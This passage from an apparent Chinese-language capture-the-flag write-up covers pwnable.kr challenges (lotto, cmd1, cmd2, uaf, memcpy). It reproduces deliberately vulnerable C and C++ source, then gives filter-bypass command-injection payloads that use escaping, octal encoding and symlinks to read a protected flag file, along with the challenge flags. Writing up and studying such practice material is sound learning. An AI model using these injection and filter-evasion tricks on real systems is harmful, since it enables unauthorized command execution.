class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYou cannot bet more money than you have."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line">        <span class="keyword">return</span> bet;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br></pre></td></tr></table></figure><p>flag: <code>YaY_I_AM_A_MILLIONARE_LOL</code></p><p>P.S. 看了一下大佬们的WP, 原来还可以输入负数....然后故意输掉..... 高,<br>实在是高!</p><h1 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h1><blockquote><p>Mommy! I made a lotto program for my homework.<br>do you want to play?</p><p>ssh <a href="mailto:lotto@pwnable.kr" target="_blank" rel="noopener">lotto@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>大乐透?</p><p>lotto.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate lotto numbers</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;     <span class="comment">// 1 ~ 45</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate lotto score</span></span><br><span class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">                match++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// win!</span></span><br><span class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// menu</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序先从标准输入获取六个字符, 再从 /dev/urandom<br>中经过一系列操作读取六个字符, 当这两组字符相等的时候, 就给我们flag......</p><p>帮助贴心地告诉了我们从数学上来讲我们获胜的机会是 <strong>1/8145060</strong></p><p>一开始是一脸懵逼的, 甚至想破解 /dev/urandom 的算法, 后来仔细看代码,<br>发现了一个地方有漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">            match++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个地方, 本意应该是想实现顺序无关的比较,<br>结果已经存在过的字符没有过滤... 导致了我们的输入至少有任意一个在 <code>lotto</code><br>数组中出现, 我们就能过关</p><p>那就随便试试吧, 我运气很好, 第二次就过了</p><p>flag: <code>sorry mom... I FORGOT to check duplicate numbers... :(</code></p><h1 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h1><blockquote><p>Mommy! what is PATH environment in Linux?</p><p>ssh <a href="mailto:cmd1@pwnable.kr" target="_blank" rel="noopener">cmd1@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">    putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    system( argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很简单, 从命令行参数中获取字符串当做命令执行</p><p>但是这个地方过滤了 flag, tmp, sh, 并且更改了path</p><p>不难绕过, payload <code>./cmd1 &quot;/bin/cat fla*&quot;</code></p><p>flag: <code>mommy now I get what PATH environment is for :)</code></p><h1 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h1><blockquote><p>Daddy bought me a system command shell.<br>but he put some filters to prevent me from playing with it without his permission...<br>but I wanna play anytime I want!</p><p>ssh <a href="mailto:cmd2@pwnable.kr" target="_blank" rel="noopener">cmd2@pwnable.kr</a> -p2222 (pw:flag of cmd1)</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** p;</span><br><span class="line">    <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">    delete_env();</span><br><span class="line">    putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    system( argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上一题是同一类型的, 不过这个过滤有点丧心病狂啊...</p><p>但这次没有过滤tmp, 可以在/tmp下创建一个symbolic link到flag</p><p>最终解法: <code>/home/cmd2/cmd2 &#39;read -r a &lt;galf;echo $a&#39;</code></p><p>flag: <code>FuN_w1th_5h3ll_v4riabl3s_haha</code></p><h2 id="大佬们的解法"><a href="#大佬们的解法" class="headerlink" title="大佬们的解法"></a>大佬们的解法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 <span class="string">"read b &lt; fl\ag; echo \$b"</span></span><br><span class="line"><span class="comment"># 妙啊, 利用转义符巧妙地避开了过滤</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; /home/cmd2/cmd2 <span class="string">'$(pwd)"bin"$(pwd)cat $(pwd)"home"$(pwd)"cmd2"$(pwd)"fl""ag"'</span></span><br><span class="line"><span class="comment"># woc, NBNB. 没有反斜杠, 我们就创造反斜杠...</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">"command -p cat fla*"</span></span><br><span class="line"><span class="comment"># 涨知识了, 膜</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'</span></span><br><span class="line"><span class="comment"># 社会社会</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp/ca</span><br><span class="line">ln -s /bin/cat /tmp/cat</span><br><span class="line"><span class="built_in">cd</span> /tmp/ca</span><br><span class="line">ln -s /home/cmd2/flag f</span><br><span class="line">/home/cmd2/cmd2 <span class="string">"\$&#123;PWD&#125;t f"</span></span><br><span class="line"><span class="comment"># 全部建symbolic link</span></span><br><span class="line"></span><br><span class="line">/home/cmd2/cmd2 <span class="string">'set -s'</span></span><br><span class="line">/bin/cat /home/cmd2/flag</span><br><span class="line"><span class="comment"># 愣是没看懂</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'$(printf \\057bin\\057cat) fl""ag'</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'$(printf "%b%c%c%c%b%c%c%c%b%b%b%c%c%c%c" "\57" "b" "i" "n" "\57" "c" "a" "t" "\40" "\56" "\57" "f" "l" "a" "g")'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/cat flag"</span> | ./cmd2 <span class="string">"read myvar; command \$myvar"</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'echo $($(cd .. &amp;&amp; cd .. &amp;&amp; pwd)bin$(cd .. &amp;&amp; cd .. &amp;&amp; pwd)cat fla*)'</span></span><br></pre></td></tr></table></figure><h1 id="uaf-TODO"><a href="#uaf-TODO" class="headerlink" title="uaf (TODO)"></a>uaf (TODO)</h1><blockquote><p>Mommy, what is Use After Free bug?</p><p>ssh <a href="mailto:uaf@pwnable.kr" target="_blank" rel="noopener">uaf@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>刚看完Double Free觉得看不懂还是来做pwnable慢慢练习, 结果就来了这个...</p><p>卧槽这次竟然是C++</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Human::introduce();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Human::introduce();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">    Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            m-&gt;introduce();</span><br><span class="line">            w-&gt;introduce();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">            data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">            read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span> m;</span><br><span class="line">            <span class="keyword">delete</span> w;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h1><blockquote><p>Are you tired of hacking?, take some rest here.<br>Just help me out with my small experiment regarding memcpy performance.<br>after that, flag is yours.</p><p><a href="http://pwnable.kr/bin/memcpy.c" target="_blank" rel="noopener">http://pwnable.kr/bin/memcpy.c</a></p><p>ssh <a href="mailto:memcpy@pwnable.kr" target="_blank" rel="noopener">memcpy@pwnable.kr</a> -p2222 (pw:guest)</p></blockquote><p>看介绍似乎不难? 不过这个解题人数让我有些不放心 = =</p><p>readme</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the compiled binary of &quot;memcpy.c&quot; source code (with real flag) will be 